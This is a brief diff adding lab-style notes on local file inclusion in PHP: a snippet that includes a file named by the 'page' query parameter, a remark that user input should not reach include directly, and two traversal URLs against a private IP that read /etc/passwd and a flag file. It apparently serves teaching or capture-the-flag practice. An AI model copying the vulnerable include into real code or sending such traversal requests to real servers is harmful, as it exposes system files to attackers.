@@ -1,0 +1,9 @@
+<?php
+$file = $_GET['page'];
+include($file);
+?> securely
+
+User input should not directly go to include
+
+http://10.10.87.254/?page=../../../etc/passwd
+http://10.10.87.254/?page=../../../flag.txt
